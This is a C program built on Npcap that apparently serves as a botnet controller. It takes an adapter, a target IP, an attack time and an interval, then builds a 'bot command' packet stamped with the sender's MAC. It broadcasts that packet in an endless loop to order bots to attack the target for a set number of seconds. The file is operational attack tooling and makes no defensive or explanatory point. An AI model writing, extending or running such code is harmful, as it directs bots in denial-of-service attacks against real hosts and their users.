#include <stdio.h>
#include <pcap/pcap.h>
#include "utils.h"
#include <unistd.h>
#include <string.h>
#include <ntddndis.h>

extern char errbuff[PCAP_ERRBUF_SIZE];
#define NPCAP_ERROR printf("NPCAP error message: \"%s\"\n", errbuff);

extern const char* adapter_id;

int main(int argc, char* argv[])
{
    // op1 - adapter
    // op2 - target_ip
    // op3 - attack time
    // op4 - timeout

    u_char ip[4] = {192, 168, 1, 13};
    int attack_time = 20;
    int timeout = 10;

    if(argc < 4)
    {
        printf("Error. You must specify adapter, target_ip, time and optionally timeout");
        return 1;
    }
    else
    {
        adapter_id = argv[1];

        ip[0] = atoi(strtok(argv[2], "."));
        for(int i=1; i<4; i++)
        {
            ip[i] = atoi(strtok(NULL, "."));
        }

        attack_time = atoi(argv[3]);

        if(argv[4])
            timeout = atoi(argv[4]);
    }

    print_availiable();
    pcap_if_t device;
    _Bool availiable = is_adapter_availiable(adapter_id, &device);
    
    if(availiable)
    printf("%s is availiable\n\n", adapter_id);
    else
    {
        printf("%s is not availiable\n\n", adapter_id);
        return 1;
    }

    printf("spamming bot command on ip: ");
    for(int i=0; i<3; i++)
        printf("%d.", ip[i]);
    printf("%d ", ip[3]);
    printf("for %d seconds every %d seconds\n\n", attack_time, timeout);

    pcap_t* handler = pcap_open_live(device.name, 65536, PCAP_OPENFLAG_PROMISCUOUS, 0, errbuff);

    if(!handler)
    {
        NPCAP_ERROR
        return 1;
    }
    
    size_t len = 6;
    u_char real_master_mac[6];
    pcap_oid_get_request(handler, OID_802_3_CURRENT_ADDRESS, real_master_mac, &len);

    u_char package[64];
    create_bot_command(ip, attack_time, real_master_mac, package);

    while(true)
    {
        pcap_sendpacket(handler, package, 42);
        printf("sending command:\n");
        for(int i=0; i<42; i++)
            printf("%x ", package[i]);
        printf("\n\n");
        sleep(timeout);
    }

    return 0;
}